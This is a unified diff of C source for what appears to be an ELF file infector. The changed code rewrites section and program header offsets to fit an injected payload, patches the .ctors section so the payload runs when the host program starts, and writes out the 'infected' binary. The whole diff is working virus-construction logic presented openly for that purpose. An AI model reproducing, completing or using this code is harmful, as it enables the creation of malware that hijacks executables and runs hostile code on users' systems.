@@ -100,6 +100,20 @@ int main(int argc, char *argv[]){
   infectedElfHeader->e_shoff += alignedPayloadSize;
   ELFN(Shdr) *infectedSectionHeaderTable = infected + infectedElfHeader->e_shoff;
 
+  char pushedBackCtors = 0;
+  for( i = 0, sectionHeader = infectedSectionHeaderTable;
+       i < infectedElfHeader->e_shnum;
+       i++, sectionHeader++ ){
+    if( sectionHeader->sh_offset == payloadOffset ){
+      sectionHeader->sh_offset += alignedPayloadSize - ctorBufferSize;
+      sectionHeader->sh_addr -= ctorBufferSize;
+      sectionHeader->sh_size += ctorBufferSize;
+      pushedBackCtors = 1;
+    }
+    else if( sectionHeader->sh_offset > payloadOffset ){
+      sectionHeader->sh_offset += alignedPayloadSize;
+    }
+  }
   //update all offsets that were pushed back by the payload
   for( i = 0, programHeader = infectedProgramHeaderTable;
        i < infectedElfHeader->e_phnum;
@@ -114,18 +128,6 @@ int main(int argc, char *argv[]){
     }
     else if( programHeader->p_offset > payloadOffset ){
       programHeader->p_offset += alignedPayloadSize;
-    }
-  }
-  for( i = 0, sectionHeader = infectedSectionHeaderTable;
-       i < infectedElfHeader->e_shnum;
-       i++, sectionHeader++ ){
-    if( sectionHeader->sh_offset == payloadOffset ){
-      sectionHeader->sh_offset += alignedPayloadSize - ctorBufferSize;
-      sectionHeader->sh_addr -= ctorBufferSize;
-      sectionHeader->sh_size += ctorBufferSize;
-    }
-    else if( sectionHeader->sh_offset > payloadOffset ){
-      sectionHeader->sh_offset += alignedPayloadSize;
     }
   }
 
@@ -145,8 +147,13 @@ int main(int argc, char *argv[]){
   }
 
   //add our payload to the ctors
-  *(ELFN(Addr)*)(infected+ctors->sh_offset) = -1;
-  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = payloadMemory;
+  if( pushedBackCtors ){
+    *(ELFN(Addr)*)(infected+ctors->sh_offset) = -1;
+    *(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = payloadMemory;
+  } else { //there was already some buffer room for .ctors
+    *(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
+    *(((ELFN(Addr)*)(infected+ctors->sh_offset)) - 1) = -1;
+  }
 
   //write out the newly infected file
   if( writeFile(argv[3], infected, infectedSize) != 0){
